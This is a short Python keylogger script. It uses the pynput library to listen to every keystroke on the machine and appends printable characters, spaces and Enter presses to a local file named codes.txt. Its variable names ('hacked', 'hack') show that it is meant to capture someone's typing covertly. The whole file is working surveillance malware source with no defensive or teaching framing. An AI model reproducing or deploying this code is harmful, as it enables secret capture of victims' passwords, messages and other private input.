import pynput
from  pynput.keyboard import  Key,Listener


hacked=[]

keey=['q','w','e','r','t','y','u','i','o','p','l','k','m','j','n','h','b','g','v','f','c','d','x','s','z','a','1','2','3','4','5','6','7','8','9','0','-','=',']','[','\\',"'",';','/','.',',','!','@','#','$','%','^','&','*','(',')','_','+','}','{','|','"',':','?','>','<',',']
def press(key):
    hacked.append(key)

    with open("codes.txt","a+") as go:

        for x in hacked:
          hack=str(x).replace("'","")
          if hack=="Key.space":

              go.write(" ")
              hacked.clear()

          elif(keey.__contains__(hack)):
              go.write(hack)
              hacked.clear()
          elif(hack=="Key.enter"):
              go.write(" (ENTER) ")
              hacked.clear()
          else:
              go.write("")



with Listener(on_press=press) as l:
    l.join()

